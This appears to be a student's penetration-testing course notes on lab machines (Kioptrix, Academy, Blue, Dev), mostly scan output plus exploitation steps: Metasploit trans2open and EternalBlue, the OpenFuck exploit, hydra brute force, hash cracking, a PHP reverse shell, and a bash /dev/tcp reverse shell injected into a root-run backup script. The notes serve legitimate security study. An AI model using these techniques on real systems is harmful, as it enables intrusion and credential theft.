
## Information Gathering (Reconnaissance)

1. Bugcrowd - Bug bounty programs
2. Hunter.io - Email address recon
3. phonebook.ez - Email address recon
4. Voilanorbert.com - Email address recon
5. Email Hipp 
6. Email checker
7. Dehashed.com
8. Hashes.org
9. use sublist3r command
10. Owasp Amass websites
11. Builthwith.com
12. Wappalyzer
13. use whatweb command
14. Burpsuite
15. Google
16. Social Media


## Scanning and Enumeration
1. Download and install, Find ip of kioptrix - 10.0.0.11 
```
sudo netdiscover 
```

2. Nmap scan
```
──(kali㉿kali)-[~]
└─$ nmap -T4 -p- -A 10.0.0.11
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-21 21:49 EDT
Nmap scan report for 10.0.0.11
Host is up (0.0020s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey: 
|   1024 b8746cdbfd8be666e92a2bdf5e6f6486 (RSA1)
|   1024 8f8e5b81ed21abc180e157a33c85c471 (DSA)
|_  1024 ed4ea94a0614ff1514ceda3a80dbe281 (RSA)
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
| http-methods: 
|_  Potentially risky methods: TRACE
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1          32768/tcp   status
|_  100024  1          32768/udp   status
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
|_ssl-date: 2023-09-22T13:52:30+00:00; +12h00m04s from scanner time.
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: 400 Bad Request
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC4_64_WITH_MD5
32768/tcp open  status      1 (RPC #100024)

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: 12h00m03s
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 198.05 seconds
```

3. Nikto Vulnerability Scan. 
```
──(kali㉿kali)-[~]
└─$ nikto -h http://10.0.0.11/
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.0.0.11
+ Target Hostname:    10.0.0.11
+ Target Port:        80
+ Start Time:         2023-09-21 22:02:52 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+ /: Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Wed Sep  5 23:12:46 2001. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Apache is vulnerable to XSS via the Expect header. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3918
+ OpenSSL/0.9.6b appears to be outdated (current is at least 3.0.7). OpenSSL 1.1.1s is current for the 1.x branch and will be supported until Nov 11 2023.
+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.9.6) (may depend on server version).
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE .
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution.
+ Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system.
+ Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi.
+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell.

```

4. Gobuster and dirsearch directory search. 
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.0.0.11:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.0.11:80/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/09/21 22:10:43 Starting gobuster in directory enumeration mode
===============================================================
Progress: 498 / 87665 (0.57%)[ERROR] 2023/09/21 22:11:07 [!] Get "http://10.0.0.11:80/buy": dial tcp 10.0.0.11:80: i/o timeout (Client.Timeout exceeded while awaiting headers)
[ERROR] 2023/09/21 22:11:07 [!] Get "http://10.0.0.11:80/47": dial tcp 10.0.0.11:80: i/o timeout (Client.Timeout exceeded while awaiting headers)
[ERROR] 2023/09/21 22:11:07 [!] Get "http://10.0.0.11:80/43": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 519 / 87665 (0.59%)[ERROR] 2023/09/21 22:11:09 [!] Get "http://10.0.0.11:80/redirect": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 522 / 87665 (0.60%)[ERROR] 2023/09/21 22:11:10 [!] Get "http://10.0.0.11:80/mac": dial tcp 10.0.0.11:80: i/o timeout (Client.Timeout exceeded while awaiting headers)
[ERROR] 2023/09/21 22:11:10 [!] Get "http://10.0.0.11:80/author": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2023/09/21 22:11:10 [!] Get "http://10.0.0.11:80/printer": dial tcp 10.0.0.11:80: i/o timeout (Client.Timeout exceeded while awaiting headers)
[ERROR] 2023/09/21 22:11:10 [!] Get "http://10.0.0.11:80/conferences": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 590 / 87665 (0.67%)[ERROR] 2023/09/21 22:11:15 [!] Get "http://10.0.0.11:80/58": dial tcp 10.0.0.11:80: i/o timeout (Client.Timeout exceeded while awaiting headers)
/manual               (Status: 301) [Size: 294] [--> http://127.0.0.1/manual/]
Progress: 984 / 87665 (1.12%)[ERROR] 2023/09/21 22:11:27 [!] Get "http://10.0.0.11:80/index1": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2023/09/21 22:11:27 [!] Get "http://10.0.0.11:80/pda": dial tcp 10.0.0.11:80: i/o timeout (Client.Timeout exceeded while awaiting headers)
[ERROR] 2023/09/21 22:11:27 [!] Get "http://10.0.0.11:80/agenda": dial tcp 10.0.0.11:80: i/o timeout (Client.Timeout exceeded while awaiting headers)
[ERROR] 2023/09/21 22:11:27 [!] Get "http://10.0.0.11:80/star": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2023/09/21 22:11:27 [!] Get "http://10.0.0.11:80/wp-includes": dial tcp 10.0.0.11:80: i/o timeout (Client.Timeout exceeded while awaiting headers)
[ERROR] 2023/09/21 22:11:27 [!] Get "http://10.0.0.11:80/ecommerce": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 1221 / 87665 (1.39%)^Z
zsh: suspended  gobuster dir -u http://10.0.0.11:80/ -w 
                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ python3 dirsearch/dirsearch.py -u http://10.0.0.11:80/                            

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                            
 (_||| _) (/_(_|| (_| )                                                                                                                                     
                                                                                                                                                            
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11713

Output: /home/kali/reports/http_10.0.0.11_80/__23-09-21_22-12-14.txt

Target: http://10.0.0.11/

[22:12:14] Starting:                                                                                                                                        
[22:12:46] 403 -  275B  - /.ht_wsr.txt                                      
[22:12:46] 403 -  278B  - /.htaccess.bak1                                   
[22:12:46] 403 -  280B  - /.htaccess.sample
[22:12:46] 403 -  278B  - /.htaccess.orig
[22:12:46] 403 -  278B  - /.htaccess_orig                                   
[22:12:46] 403 -  279B  - /.htaccess_extra
[22:12:46] 403 -  276B  - /.htaccess_sc
[22:12:46] 403 -  276B  - /.htaccessBAK
[22:12:46] 403 -  277B  - /.htaccessOLD2
[22:12:46] 403 -  276B  - /.htaccessOLD
[22:12:46] 403 -  268B  - /.htm                                             
[22:12:46] 403 -  278B  - /.htpasswd_test                                   
[22:12:46] 403 -  274B  - /.htpasswds                                       
[22:12:46] 403 -  275B  - /.httr-oauth
[22:12:47] 403 -  278B  - /.htaccess.save                                   
[22:12:47] 403 -  269B  - /.html                                            
[22:15:47] 403 -  272B  - /cgi-bin/                                         
[22:16:16] 403 -  268B  - /doc/                                             
[22:16:16] 403 -  283B  - /doc/en/changes.html                              
[22:16:16] 403 -  283B  - /doc/html/index.html
[22:16:16] 403 -  282B  - /doc/stable.version
[22:16:17] 403 -  272B  - /doc/api/                                         
[22:17:18] 301 -  294B  - /manual  ->  http://127.0.0.1/manual/              
[22:17:24] 200 -   17KB - /mrtg/                                             
[22:18:40] 200 -   27B  - /test.php                                          
[22:18:52] 301 -  293B  - /usage  ->  http://127.0.0.1/usage/                
[22:19:11] 403 -  273B  - /~operator                                         
[22:19:11] 403 -  269B  - /~root                                             
                                                                              
Task Completed 
```

5. SMB Enumeration - Use metasploit and smbclient 
```
msf6 auxiliary(scanner/smb/smb_version) > options

Module options (auxiliary/scanner/smb/smb_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   THREADS  1                yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 10.0.0.11
RHOSTS => 10.0.0.11
msf6 auxiliary(scanner/smb/smb_version) > run

[*] 10.0.0.11:139         - SMB Detected (versions:) (preferred dialect:) (signatures:optional)
[*] 10.0.0.11:139         -   Host could not be identified: Unix (Samba 2.2.1a)
[*] 10.0.0.11:            - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_version) > 


┌──(kali㉿kali)-[~]
└─$ smbclient -L \\\\10.0.0.11\\
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        IPC$            IPC       IPC Service (Samba Server)
        ADMIN$          IPC       IPC Service (Samba Server)
Reconnecting with SMB1 for workgroup listing.
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful

        Server               Comment
        ---------            -------
        KIOPTRIX             Samba Server

        Workgroup            Master
        ---------            -------
        MYGROUP              KIOPTRIX
                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ smbclient \\\\10.0.0.11\\ADMIN$
Password for [WORKGROUP\kali]:
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful
tree connect failed: NT_STATUS_WRONG_PASSWORD
                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ smbclient \\\\10.0.0.11\\IPC$  
Password for [WORKGROUP\kali]:
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!              
smb: \> ls
NT_STATUS_NETWORK_ACCESS_DENIED listing \*
smb: \> exit
               
```

6. SSH Enumeration 
```
┌──(kali㉿kali)-[~]
└─$ ssh 10.0.0.11                
Unable to negotiate with 10.0.0.11 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1

┌──(kali㉿kali)-[~]
└─$ ssh 10.0.0.11 -oKexAlgorithms=+diffie-hellman-group1-sha1
Unable to negotiate with 10.0.0.11 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss

```

## Vulnerability Scanning with Nessus

1. Download and install from tenable nessus. 

2. Run it against Kioptrix and check out report. 


## Exploitation Basics 

1. Reverse shell 
![[Pasted image 20230922151216.png]]

2. Bind shell
![[Pasted image 20230922152702.png]]

3. Staged vs non-staged payloads
![[Pasted image 20230922154550.png]]

4. Gaining Root with Metasploit
```
msf6 exploit(linux/samba/trans2open) > show options

Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.0.0.11        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   139              yes       The target port (TCP)


Payload options (linux/x86/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   CMD    /bin/sh          yes       The command string to execute
   LHOST  192.168.179.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce



View the full module info with the info, or info -d command.

msf6 exploit(linux/samba/trans2open) > exploit

```

5. Manual Exploitation
a. Download OpenFuck.c

```
git clone https://github.com/heltonWernik/OpenFuck.git
```

b. Install ssl-dev library

```
apt-get install libssl-dev
```

c. It's Compile Time

```
gcc -o OpenFuck OpenFuck.c -lcrypto
```

d. Running the Exploit

```
./OpenFuck
```

e. See which service you witch to exploit. For example if you need to Red Hat Linux, using apache version 1.3.20. Trying out using the 0x6a option ./OpenFuck 0x6a [Target Ip] [port] -c 40

for example:

```
./OpenFuck 0x6a 192.168.80.145 443 -c 40
```


6. Brute Force Attack
```
┌──(kali㉿kali)-[~]
└─$ hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://10.0.0.11:22 -t 4 -V

```

## Capstone challenges

### Academy

1. First give ip address to victim machine by logging on it and then find its ip address from attack machine. 
```
 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                      
                                                                                                                                                    
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                                    
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.179.1   00:50:56:c0:00:08      1      60  VMware, Inc.                                                                                     
 192.168.179.2   00:50:56:e2:22:2d      1      60  VMware, Inc.                                                                                     
 192.168.179.130 00:0c:29:ff:9d:a5      1      60  VMware, Inc.                                                                                     
 192.168.179.254 00:50:56:ea:1b:73      1      60  VMware, Inc.                                                                                     

zsh: suspended  sudo netdiscover -r 192.168.179.0/24

```

2. Nmap machine. 
```
┌──(kali㉿kali)-[~]
└─$ nmap -A -p- -T4 192.168.179.130
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-23 20:06 EDT
Nmap scan report for 192.168.179.130
Host is up (0.00082s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.179.128
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 c744588690fde4de5b0dbf078d055dd7 (RSA)
|   256 78ec470f0f53aaa6054884809476a623 (ECDSA)
|_  256 999c3911dd3553a0291120c7f8bf71a4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.08 seconds

```

3. Ftp login and get notes, read it out and crack the hash. 
```
┌──(kali㉿kali)-[~]
└─$ sudo ftp 192.168.179.130            
Connected to 192.168.179.130.
220 (vsFTPd 3.0.3)
Name (192.168.179.130:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||61298|)
150 Here comes the directory listing.
-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||32103|)
150 Opening BINARY mode data connection for note.txt (776 bytes).
100% |********************************************************************************************************|   776      444.46 KiB/s    00:00 ETA
226 Transfer complete.
776 bytes received in 00:00 (304.95 KiB/s)
ftp> exit
221 Goodbye.

┌──(kali㉿kali)-[~]
└─$ cat note.txt       
Hello Heath !
Grimmie has setup the test website for the new academy.
I told him not to use the same password everywhere, he will change it ASAP.


I couldn't create a user via the admin panel, so instead I inserted directly into the database with the following command:

INSERT INTO `students` (`StudentRegno`, `studentPhoto`, `password`, `studentName`, `pincode`, `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`) VALUES
('10201321', '', 'cd73502828457d15655bbd7a63fb0bc8', 'Rum Ham', '777777', '', '', '', '7.60', '2021-05-29 14:36:56', '');

The StudentRegno number is what you use for login.


Le me know what you think of this open-source project, it's from 2020 so it should be secure... right ?
We can always adapt it to our needs.

-jdelta

┌──(kali㉿kali)-[~]
└─$ hash-identifier                                                                               
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: cd73502828457d15655bbd7a63fb0bc8

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))


┌──(kali㉿kali)-[~]
└─$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt a.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
student          (?)     
1g 0:00:00:00 DONE (2023-09-23 20:12) 100.0g/s 211200p/s 211200c/s 211200C/s amore..morado
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 



```

4. Find subdirectories. /academy was found where reverse shell.php was uploaded then reverse shell is obtained. 
```
┌──(kali㉿kali)-[~]
└─$ sudo nc -nvlp 1234             
listening on [any] 1234 ...
connect to [192.168.179.128] from (UNKNOWN) [192.168.179.130] 53412
Linux academy 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux
 20:29:27 up 27 min,  1 user,  load average: 0.00, 0.02, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     tty1     -                20:01   26:43   0.01s  0.00s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

5. Now, upload linpeas.sh and read out the result, found grimme credentials. 
```
cat /var/www/html/includes/config.php

$mysql_hostname = "localhost";
$mysql_user = "grimmie";
$mysql_password = "My_V3ryS3cur3_P4ss";
$mysql_database = "onlinecourse";
$bd = mysqli_connect($mysql_hostname, $mysql_user, $mysql_password, $mysql_database) or die("Could not connect database");
```

6. SSH login and change backup.sh file with bash reverse command, listened it, obtained root shell. 
```
grimmie@academy:~$ nano backup.sh

#!/bin/bash

bash -i >& /dev/tcp/192.168.179.128/5555 0>&1


┌──(kali㉿kali)-[~]
└─$ sudo nc -nvlp 5555 
[sudo] password for kali: 
listening on [any] 5555 ...
connect to [192.168.179.128] from (UNKNOWN) [192.168.179.130] 53700
bash: cannot set terminal process group (15145): Inappropriate ioctl for device
bash: no job control in this shell
root@academy:~# ls
ls
flag.txt
root@academy:~# cat flag.txt
cat flag.txt
Congratz you rooted this box !
Looks like this CMS isn't so secure...
I hope you enjoyed it.
If you had any issue please let us know in the course discord.

Happy hacking !
root@academy:~# 

```


### Blue 
#eternalblue

1. Nmap scan 
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -A -T4 192.168.179.131  
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-23 22:38 EDT
Nmap scan report for 192.168.179.131
Host is up (0.00095s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 00:0C:29:0F:9E:BB (VMware)
Device type: general purpose
Running: Microsoft Windows 7|2008|8.1
OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1
Network Distance: 1 hop
Service Info: Host: WIN-845Q99OO4PP; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: WIN-845Q99OO4PP, NetBIOS user: <unknown>, NetBIOS MAC: 000c290f9ebb (VMware)
| smb-os-discovery: 
|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: WIN-845Q99OO4PP
|   NetBIOS computer name: WIN-845Q99OO4PP\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-09-23T22:40:02-04:00
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-09-24T02:40:02
|_  start_date: 2023-09-24T13:25:22
|_clock-skew: mean: 1h20m00s, deviation: 2h18m33s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE
HOP RTT     ADDRESS
1   0.95 ms 192.168.179.131

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.53 seconds
```


2. Metasploit exploitation. 
```
msf > use exploit/windows/smb/ms17_010_eternalblue msf exploit(ms17_010_eternalblue) > show targets ...targets... msf exploit(ms17_010_eternalblue) > set TARGET < target-id > msf exploit(ms17_010_eternalblue) > show options ...show and set options... msf exploit(ms17_010_eternalblue) > exploit
```

3. Hashdump and crack it. 
```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:58f5081696f366cdc72491a2c4996bd5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:f580a1940b1f6759fbdd9f5c482ccdbb:::
user:1000:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::

```

### Dev

1. Nmap scan. Interesting ports are 80 and 8080.
```
┌──(kali㉿kali)-[~]
└─$ nmap -A -p- -T4 192.168.179.132
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-23 23:01 EDT
Nmap scan report for 192.168.179.132
Host is up (0.0015s latency).
Not shown: 65526 closed tcp ports (conn-refused)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd96ec082fb1ea06cafc468a7e8ae355 (RSA)
|   256 56323b9f482de07e1bdf20f80360565e (ECDSA)
|_  256 95dd20ee6f01b6e1432e3cf438035b36 (ED25519)
80/tcp    open  http     Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Bolt - Installation error
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      34079/tcp   mountd
|   100005  1,2,3      38296/udp   mountd
|   100005  1,2,3      48147/tcp6  mountd
|   100005  1,2,3      54338/udp6  mountd
|   100021  1,3,4      34891/tcp6  nlockmgr
|   100021  1,3,4      38579/tcp   nlockmgr
|   100021  1,3,4      51439/udp6  nlockmgr
|   100021  1,3,4      51879/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
8080/tcp  open  http     Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: PHP 7.3.27-1~deb10u1 - phpinfo()
34079/tcp open  mountd   1-3 (RPC #100005)
36213/tcp open  mountd   1-3 (RPC #100005)
38579/tcp open  nlockmgr 1-4 (RPC #100021)
42111/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.93 seconds
                                                                  
```

2. Subdirectory checking on both ports. 
```
                                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ python3 dirsearch/dirsearch.py -u http://192.168.179.132/           

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                      
 (_||| _) (/_(_|| (_| )                                                                                                                               
                                                                                                                                                      
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11713

Output: /home/kali/reports/http_192.168.179.132/__23-09-23_23-05-30.txt

Target: http://192.168.179.132/

[23:05:30] Starting:                                                                                                                                  
[23:05:37] 200 -  931B  - /.gitignore                                       
[23:05:38] 403 -  280B  - /.htaccess.bak1                                   
[23:05:38] 403 -  280B  - /.htaccess.save
[23:05:38] 403 -  280B  - /.htaccess.orig                                   
[23:05:38] 403 -  280B  - /.htaccess_sc                                     
[23:05:38] 403 -  280B  - /.htaccess_orig
[23:05:38] 403 -  280B  - /.htaccessBAK
[23:05:37] 403 -  280B  - /.ht_wsr.txt
[23:05:38] 403 -  280B  - /.htaccess.sample                                 
[23:05:38] 403 -  280B  - /.htm
